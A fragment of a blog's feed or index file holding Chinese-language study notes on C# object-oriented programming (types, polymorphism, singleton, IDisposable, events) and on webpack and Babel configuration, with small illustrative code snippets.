MyClickEventArgus(ClickCount));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class MyClickEventArgus : EventArgs</span><br><span class="line">&#123;</span><br><span class="line">    public readonly int ClickCount;</span><br><span class="line">    public MyClickEventArgus(int ClickCountValue)</span><br><span class="line">    &#123;</span><br><span class="line">        ClickCount = ClickCountValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>实践?不一定&gt;一个方法响应多个控件的事件：<br>    窗体上有三个按钮，点击不同按钮，标签控件显示出相应的信息：按钮XXX被单击。<br>    要求：<br>        只能使用一个事件响应方法，响应三个按钮的单击事件。<br>        事件响应方法中需要区分出到底是哪个按钮被单击的，你是怎么做的？    </p><p>未：对象序列化，程序信息的保存<br>实践：两个对象间信息的双向传送<br>对象间的信息广播，使用event实现点击广播信息</p>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0：c#教程-概述</title>
      <link href="/categories/C/%E6%95%99%E7%A8%8B/0%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E6%A6%82%E8%BF%B0/"/>
      <url>/categories/C/%E6%95%99%E7%A8%8B/0%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://referencesource.microsoft.com/">查看和调试 .net 源码</a><br>ildsm 工具查看程序集，SDK 目录下<br>ilspy 反汇编工具</p><h2 id="1-3-C-面向对象编程基础"><a href="#1-3-C-面向对象编程基础" class="headerlink" title="1.3 C#面向对象编程基础"></a>1.3 C#面向对象编程基础</h2><p>如何表达信息 –&gt; 选择合适的数据结构<br>如何处理信息 –&gt; 算法和程序控制结构<br>如何实现    –&gt; 软件系统架构，面向对象的分析与设计</p><h3 id="怎样构造求解问题的算法？"><a href="#怎样构造求解问题的算法？" class="headerlink" title="怎样构造求解问题的算法？"></a>怎样构造求解问题的算法？</h3><p>算法，主要指为了解决某个问题而设计的一种解决方案。<br>数据结构，对数据进行抽象<br>程序 = 数据结构 + 算法</p><p>面向过程编程，”从下层到上层”地逐层开发，先开发底层（被别人调用，自己不调用别人的函数），再开发中间层函数（调用底层已经实现好的函数），最后开发顶层函数（调用中间层的函数，注意最好不要跨层调用）。</p><span id="more"></span><p>面向对象编程，职责明确，封装。<br>好处：使用者简单易用，必要时可以修改算法。</p><h3 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h3><p>类的构建主要靠抽象。”抽象”的具体实施方法：提取出事物的本质，忽略所有不相关、不重要的信息，以”类”的形式表达出来。<br>观察的角度不同，目的不同，对同一事物进行抽象，会得到不同的抽象模型。例如人在公司中，可以抽象员工与经理；在学校中，则可以抽象出学生与老师。</p><h4 id="类的定义与使用"><a href="#类的定义与使用" class="headerlink" title="类的定义与使用"></a>类的定义与使用</h4><ol><li>使用<code>new</code>关键字创建“<strong>类的实例</strong>”，即对象。</li><li>用“类”类型的变量（即“<strong>对象变量</strong>”）来保存对创建出来对象的引用。</li><li>通过对象变量来访问对象的<strong>公有</strong>成员（包括方法和字段）。</li></ol><h4 id="对象与对象变量"><a href="#对象与对象变量" class="headerlink" title="对象与对象变量"></a>对象与对象变量</h4><p>变量的两种类型：引用类型和值类型。</p><ul><li>“类”类型的变量属于“**引用类型(Reference Type)<strong>”；其引用的对象占用的内存位于“</strong>托管堆(managed heap)**”中。托管堆中的变量需要等到进程结束后，操作系统才会把整个内存进行回收。</li><li>int之类简单类型的变量属于“**值类型(Value Type)<strong>”，值类型的变量占用的内存位于“</strong>线程堆栈(thread stach)**”中。线程堆栈中的变量在线程结束后会自动销毁，其所占的内存就会被回收。</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li>obj1 和 obj2 是否引用两个不同的变量？ 答：引用的是相同地变量,赋的值是对象保存在托管堆中的地址。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A obj1 = new A();</span><br><span class="line">A obj2 = null;</span><br><span class="line">obj2 = obj1;</span><br></pre></td></tr></table></figure></li></ol><div style="text-align:center">  <img src="https://tva1.sinaimg.cn/mw690/005zbIM7ly1gjlj3z7vp4j30ic09eajh.jpg" alt="图片1"> </div><ol start="2"><li><p>Equals 和 ==<br>在值类型的变量比较中，没有任何区别。在引用类型的变量中，Equals 会默认比较引用的类型的对象是否是同一个，不是则返回false；不过，可以为对象重写<code>Equals</code>和<code>GetHashCode</code>方法进行比较（字符串 string 是引用类型，就是重写了Equals 方法）</p></li><li><p>this 是什么<br>this是特殊的对象引用，代表对象本身。位于同一类内部的成员彼此访问，本质上是通过 this 这个特殊引用进行访问的，只不过这个关键字通常被省略了。<br>所以，通过对象变量来访问对象的实例成员，是面向对象编程的一个基本准则（对象内部也通过 this 来访问）。</p></li><li><p>可以把值类型变量赋给引用类型吗？ 答：可以，因为 C# 中最底层的基类都是 object。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int num = 123;</span><br><span class="line">object obj = num; //装箱：值类型变量赋给引用类型变量 </span><br><span class="line">int val = (int)obj; //拆箱：引用类型变量赋给值类型变量</span><br><span class="line">// 装箱和拆箱会带来大的性能损失，需要尽量避免。</span><br></pre></td></tr></table></figure></li></ol><h3 id="子类对象和父类变量间的矛盾和冲突"><a href="#子类对象和父类变量间的矛盾和冲突" class="headerlink" title="子类对象和父类变量间的矛盾和冲突"></a>子类对象和父类变量间的矛盾和冲突</h3><h4 id="父类对象可以引用子类变量"><a href="#父类对象可以引用子类变量" class="headerlink" title="父类对象可以引用子类变量"></a>父类对象可以引用子类变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Animal an = null;</span><br><span class="line">Lion lion = new Lion();</span><br><span class="line">an = lion; // 正确</span><br><span class="line">lion = an;  // &quot;编译&quot;时出错</span><br><span class="line">lion = (Lion)an; //正确，使用类型强制转换</span><br><span class="line">Monkey monkey = (Monkey)an;  //&quot;运行&quot;时出错</span><br></pre></td></tr></table></figure><h4 id="方法同名：重载或重写"><a href="#方法同名：重载或重写" class="headerlink" title="方法同名：重载或重写"></a>方法同名：重载或重写</h4><p>重载（Overload)参数类型、个数、次序不一致，重写（Override）则完全一致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">略</span><br><span class="line"></span><br><span class="line">Parent p = new Child(); // 父类变量引用子类对象</span><br><span class="line">p.OverloadF();   // 调用父类对象方法</span><br><span class="line">(p as Chile).OverloadF(100)  //调用的是子类对象「重写」的方法</span><br><span class="line">p.OverrideF();  //!调用的是子类对象「重载」的方法,, 需要在基类中定义虚方法（virtual）</span><br></pre></td></tr></table></figure><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><h5 id="new作为修饰符，override和new的区别"><a href="#new作为修饰符，override和new的区别" class="headerlink" title="new作为修饰符，override和new的区别"></a>new作为修饰符，override和new的区别</h5><blockquote><p>new 关键字可以显式隐藏从基类继承的成员,不加就是会警告。<br>使用new关键字：声明类是哪个类，就调用哪个类的方法；<br>使用virtual + override关键字：从实例类往基类方向找有没有实现此方法的类，找到的第一个执行。</p></blockquote><h4 id="字段同名：相互隐藏"><a href="#字段同名：相互隐藏" class="headerlink" title="字段同名：相互隐藏"></a>字段同名：相互隐藏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Parent&#123;</span><br><span class="line">  public int val = 100;</span><br><span class="line">&#125;</span><br><span class="line">class Child:Parent&#123;</span><br><span class="line">  public int val = 200;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent p = new Child(); //父类变量引用子类对象</span><br><span class="line">Console.WriteLine(p.val);  // 输出 100,即父类字段的值</span><br><span class="line">Console.WriteLine((p as Child).val); //输出 200</span><br></pre></td></tr></table></figure><p>我们可以看到，方法同名和字段同名最大的不同，在于重载时，父类调用的是子类的方法；而字段同名时，父类还是需要类型转换才能输出子类的字段值。所以，建议<strong>不要</strong>在子类中定义与父类同名的字段。</p><h3 id="接口与回调"><a href="#接口与回调" class="headerlink" title="接口与回调"></a>接口与回调</h3><h4 id="为什么会有接口？"><a href="#为什么会有接口？" class="headerlink" title="为什么会有接口？"></a>为什么会有接口？</h4><p>鸭子是一种鸟，会游泳，也是一种食物，我们可以把鸭子作为 鸟 和 食物 的子类。但是会存在以下几个问题：</p><ol><li>C# 和 java 不支持多继承；</li><li>“游泳”这个方法应该放在哪个类中？只有一部分鸟类会游泳。<br>所以，我们可以将“鸟”作为“鸭子”的<strong>基类</strong>，“会游泳”和“食物”这些特性作为<strong>接口</strong>来实现相关方法。</li></ol><h4 id="接口的实际应用：回调"><a href="#接口的实际应用：回调" class="headerlink" title="接口的实际应用：回调"></a>接口的实际应用：回调</h4><p>实现点击任意键，回调函数。代码在<a href="">这里</a>。</p><div style="text-align:center"><img src="https://tva2.sinaimg.cn/thumbnail/005zbIM7ly1gjsg5op6j2j30lf09vgvf.jpg" alt="image"></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 主线程</span><br><span class="line">Controler controler  = new Controler(); // 创建控制器对象</span><br><span class="line">controler.AddCallback(new CallBackClass()); // 传入回调对象1，实现输出时间</span><br><span class="line">controler.AddCallback(new CallBackClass2());  // 传入回调对象2，实现输出次数</span><br><span class="line">// controler.AddCallback(new CallBackClass999())  // 可以在不更改原有代码的情况下扩展</span><br><span class="line">controler.Begin(); //启动控制器对象运行</span><br></pre></td></tr></table></figure><p>使用回调的好处在于可扩展性，如果需要在添加控制器运行的事件，<strong>不用更改</strong>原来的代码，只需要添加一个继承了<code>ICallBack</code>接口的<code>CallBackClass</code>类，实现相关方法即可。</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>概念：同一操作用于不同的类的实例，不同的类将进行不同的解释，最后产生不同的结果。</p><p>多态的实现方式：<strong>继承多态</strong>和<strong>接口多态</strong></p><h4 id="继承多态"><a href="#继承多态" class="headerlink" title="继承多态"></a>继承多态</h4><p>通过抽象类和抽象方法实现的。<br>注意，抽象方法一定在抽象类中，抽象类不一定是抽象方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// C#中类或方法前加一个 `abstract`关键字就可以定义抽象类和抽象方法了。</span><br><span class="line">abstract class Fruit()&#123;</span><br><span class="line">  public abstract void GrowInArea();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Apple:Fruit&#123;</span><br><span class="line">  // 重载方法</span><br><span class="line">  public override void GrowInArea()&#123;</span><br><span class="line">    // 一些话</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Pineapple:Fruit&#123;</span><br><span class="line">  // 同上</span><br><span class="line">  public override void GrowInArea()&#123;</span><br><span class="line">    //</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 使用了‘多态’特性的方法，其代码具有稳定性，与具体子类无关</span><br><span class="line">static void PolymorphismMethod(Fruit fruit)&#123;</span><br><span class="line">  fruit.GrowInArea();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 运行代码</span><br><span class="line">//抽象类不能通过 `new` 直接创建对象，只能作为用它作为对象变量来引用子类的对象。</span><br><span class="line">PolymorphismMethod(new Apple());</span><br><span class="line">PolymorphismMethod(new Pineapple());</span><br></pre></td></tr></table></figure><p>多态：代码有更强的适用性，多态特性可以帮助我们将需要改动的地方减少到最低限度。</p><h3 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h3><h4 id="对象注入-生命周期完全独立"><a href="#对象注入-生命周期完全独立" class="headerlink" title="对象注入:生命周期完全独立"></a>对象注入:生命周期完全独立</h4><p>一般来说直接使用<code>new</code>关键字创建实例，但还有一种<strong>对象注入</strong>的构造方式进行对象的创建。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class B&#123;&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">  // 私有变量用来保存类B的对象变量</span><br><span class="line">  private B innerObj;</span><br><span class="line">  </span><br><span class="line">  public A(B obj)&#123;</span><br><span class="line">    innerObj = obj;  // 用私有变量来保存外部注入的B对象的引用</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于接口的对象注入"><a href="#基于接口的对象注入" class="headerlink" title="基于接口的对象注入"></a>基于接口的对象注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">interface MyInterface&#123;&#125;</span><br><span class="line"></span><br><span class="line">class B:interface&#123;&#125;   类B 实现了该接口</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">  private MyInterface innerObj;</span><br><span class="line"></span><br><span class="line">  public A(MyInterface obj)&#123;</span><br><span class="line">    innerObj = obj;  // 与上一个例子的区别在于，使用 MyInterface 作为对象变量的类型</span><br><span class="line">    // 断开类A 和 类B 的强耦合性</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 使用时</span><br><span class="line">A obj = new A(new B);</span><br></pre></td></tr></table></figure><h4 id="基于抽象基类的对象注入"><a href="#基于抽象基类的对象注入" class="headerlink" title="基于抽象基类的对象注入"></a>基于抽象基类的对象注入</h4><p>与基于接口类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract class MyAbstractClass&#123;&#125;;</span><br><span class="line"></span><br><span class="line">// ... 后面都差不多</span><br></pre></td></tr></table></figure><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>只允许创建一个实例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">calss OnlyYou&#123;</span><br><span class="line">  private static OnlyYou obj = null; //或者这儿： obj = new OnlyYou();  // 底下直接 retunr obj;</span><br><span class="line"></span><br><span class="line">  private OnlyYou()&#123;  // 私有构造方法，使外界不能使用new直接创建对象·</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static OnlyYou GetOnlyYou()&#123;</span><br><span class="line">    if(obj == null)&#123;</span><br><span class="line">      obj = new OnlyYou();</span><br><span class="line">    &#125;</span><br><span class="line">    return obj;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在多线程环境下，可能会出现 <code>OnlyYou</code>被构造多次，比如线程一在创建过程中，线程二判断对象未创建，实际则是线程一未创建完成，所以线程二也会创建。<br>解决方案：</p><ol><li>加锁 lock<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static OnlyYou GetOnlyYou()&#123;</span><br><span class="line">  lock(typeof(OnlyYou))&#123;</span><br><span class="line">    // 同上</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>2.使用CLR支持的同步特性，效果与加锁类似，只不过是锁定在方法级别而不是锁定在类型级别</p><p>3.方法1和2都会造成性能损失，最好时使用类的<strong>静态构造函数</strong>，因为.net 虚拟机（CLR）会保证这个方法只被执行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">calss OnlyYou&#123;</span><br><span class="line">  private static OnlyYou obj = null;</span><br><span class="line"></span><br><span class="line">  private OnlyYou()&#123; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  static OnlyYou()&#123; // 静态构造方法</span><br><span class="line">    obj = new OnlyYou();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static OnlyYou GetOnlyYou()&#123;</span><br><span class="line">    return obj;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单例模式的巩固练习"><a href="#单例模式的巩固练习" class="headerlink" title="单例模式的巩固练习"></a>单例模式的巩固练习</h3><blockquote><p>在许多桌面应用中，都拥有超过一个以上的窗体，而不少应用都支持F1键调出帮助文档。对于显示帮助文档的窗体而言，当然你可以让用户每次压F1键时都创建一个新的窗体对象显示相应的内容，但更合适的方式是整个应用只实例化一个帮助文档显示窗体对象。这是一个比较适合于应用Singleton设计模式的场景。<br>请编写一个示例应用，应用Singleton设计模式实现某桌面应用的帮助文档显示功能。<br>要求：</p><ol><li>整个应用只有一个帮助窗体对象</li><li>在不同的窗体压F1键，帮助文档窗体中应该显示不同的内容。</li></ol></blockquote><p>代码在<a href="">这里</a>,有个问题，help 关闭时，资源直接释放掉了。没成功，以后再说吧。</p><blockquote><p>世上无难事，只要肯放弃。</p></blockquote><h3 id="对象销毁"><a href="#对象销毁" class="headerlink" title="对象销毁"></a>对象销毁</h3><p>C# 采用“隐式回收”的方式销毁对象，成为“垃圾回收(Garbage Collection)”。<br>析构方法：</p><ul><li><p>由于无法显式的重写Finalize方法，只能通过析构函数语法形式来实现</p></li><li><p>执行垃圾回收之前系统会自动执行Finalize操作</p></li><li><p>Finalize方法会极大地损伤性能</p></li><li><p><strong>不建议</strong>重写析构方法**，应该让CLR负责销毁对象；如果需要显式回收资源，可以使用<code>Disposable</code>编程模式来解决。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MyClas:IDisposable&#123;</span><br><span class="line">  ~MyClass()&#123;</span><br><span class="line">    Dispose(); // 析构函数中调用Dispose方法</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void Dispose()&#123;</span><br><span class="line">    // 编写代码释放资源 </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>析构方法通常用于清理非托管资源</p></li><li><p><code>Dispose()</code> 方法，则可以同时清理托管和非托管资源</p></li><li><p><code>Dispose()</code> 方法应该能被安全的调用多次<br><code>IDisposable</code> 编程框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class MyClass:IDisposable&#123;</span><br><span class="line">  ~MyClass()&#123;  Dispose(false); &#125; // 只清理非托管资源</span><br><span class="line">  public void Dispose()&#123;</span><br><span class="line">    Dispose(true); // 清理所有资源</span><br><span class="line">    // 不需要再调用本对象的Finallize() 方法</span><br><span class="line">    GC.SupperssFinalize(this);</span><br><span class="line">  &#125;</span><br><span class="line">  protected virtual void Dispose(bool disposing)&#123;</span><br><span class="line">    if(disposing)&#123;</span><br><span class="line">      //清理托管资源</span><br><span class="line">    &#125;</span><br><span class="line">    //q清理非托管资源</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="using关键字"><a href="#using关键字" class="headerlink" title="using关键字"></a>using关键字</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using(MyClass obj = new MyClass())&#123;</span><br><span class="line">  // do something...</span><br><span class="line">&#125;</span><br><span class="line">// 相当于</span><br><span class="line">MyClass obj = new MyClass();</span><br><span class="line">try&#123;</span><br><span class="line">  // do something...</span><br><span class="line">&#125;finally&#123;</span><br><span class="line">  // 调用Dispose方法</span><br><span class="line">  //所以使用using关键字的对象必须实现 IDisposable 接口</span><br><span class="line">  IDisposable disposable = obj as IDisposable;</span><br><span class="line">  if(obj != null)&#123;</span><br><span class="line">    obj.Dispose(); // 释放资源</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="托管资源与非托管资源"><a href="#托管资源与非托管资源" class="headerlink" title="托管资源与非托管资源"></a>托管资源与非托管资源</h4><ul><li>托管资源：<strong>托管堆</strong>上分配的内存资源, 其由.NET运行时在适当的时候调用垃圾回收器进行<strong>回收</strong>（也可使用GC.Collect() 自主触发垃圾回收机制）。</li><li>非托管资源：.NET<strong>不知道如何回收</strong>的资源，一般是与操作系统核心相关的资源，比如文件，数据库连接，网络连接、图标等。任何包含非托管资源的类，都应该继承<code>IDisposable</code>接口并实现<code>Dispose()方法</code>方法，以确保非托管资源的正确释放。</li></ul><h4 id="托管执行过程"><a href="#托管执行过程" class="headerlink" title="托管执行过程"></a>托管执行过程</h4><ol><li>选择编译器：即选择对应语言的编译器，来进行语言级别的处理，如语法检查；</li><li>将代码编译为 MSIL：将源代码转换为一组独立于CPU且可转换为本地代码的指令，即MSIL。</li><li>将 MSIL 编译为本机代码：.NET framework提供了两种转换方式：JIT（实时编译器）和NGen.exe(本机映像生成器)</li><li>运行代码</li></ol>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack版本升级</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/WebPack/webpack%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/WebPack/webpack%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<p>webpack-merge 合并配置</p><p>rimraf 删除文件</p><p>chalk 控制控制台输出的样式</p><p>ora 实现node.js命令行环境的loading效果，和显示各种状态的图标等</p><p>html-webpack-plugin  生成html文件</p><p>CleanWebpackPlugin 清楚前次打包文件</p><span id="more"></span><p>MiniCssExtractPlugin：<br>    和 style-loader 的区别：MiniCssExtractPlugin 提取 JS 中引入的 CSS 打包到单独文件中，然后(结合html-webpack-plugin)以标签 <code>&lt;link&gt;</code>添加到头部；style-loader 则是通过 <code>&lt;style&gt;</code> 标签直接将 CSS 插入到 DOM 中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最好这样配置？</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">use: [</span><br><span class="line">devMode?<span class="string">&#x27;style-loader&#x27;</span>:MiniCssExtractPlugin.loader,<span class="string">&#x27;css-loader&#x27;</span>,<span class="string">&#x27;postcss-loader&#x27;</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alias :{‘vue$’: ‘vue/dist/vue.esm.js’, } import Vue form ‘vue’ 时生效, vue$ 表示精确匹配，使用vue库 vue.ems.js文件，</p><h3 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h3><p>babel-loader 和 babel-preset-env 的作用：<br>    babel:广泛使用的 ES6 转码器，将 ES6 代码转为 ES5 代码，从而在老版本的浏览器执行。<br>    babel-core: babel编译库的核心包<br>    babel-loader: 在webpack中帮助你使用babel<br>    preset: 在babel编译之前，babel需要了解你的编译规则(js的版本吗？)，以什么规范去编译<br>    babel-preset-env: 最新的规范，包含了 babel-preset-es2015，babel-preset-es2016，babel-preset-es2017</p><p>许多浏览器对es6语法支持的很好，所以不用做很多编译，但如果要兼容到低版本，有的语法有需要编译（转换）。所以可以设置编译程度：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// babelrc文件</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;presets&#x27;</span>: [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&#x27;babel-preset-env&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">targets</span>: &#123;</span><br><span class="line">                    <span class="attr">browser</span>: [<span class="string">&#x27;&gt; 1%&#x27;</span>]  <span class="comment">//编译出来的语法支持所有市场占有率超过1%的浏览器</span></span><br><span class="line">                    <span class="comment">//browser: [&#x27;chrome&#x27;]   // 只打算兼容chrome浏览器</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>babel不处理Promise、Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol等全局对象，所以需要 babel-polyfill 去兼容低版本浏览器。<br>不过 babel-polyfill 会有污染全局环境和造成代码冗余的缺点。<br>所以最好使用 <code>babel-plugin-transform-runtime</code> 来解决。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .babelrc文件</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;presets&#x27;</span>:[</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&#x27;babel-preset-env&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">targets</span>: &#123;</span><br><span class="line">                    <span class="attr">browser</span>: [<span class="string">&#x27;&gt; 1%&#x27;</span>, <span class="string">&#x27;last 2 versions&#x27;</span>]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;plugins&#x27;</span>: [<span class="string">&#x27;transform-runtime&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="webpack的四个核心概念"><a href="#webpack的四个核心概念" class="headerlink" 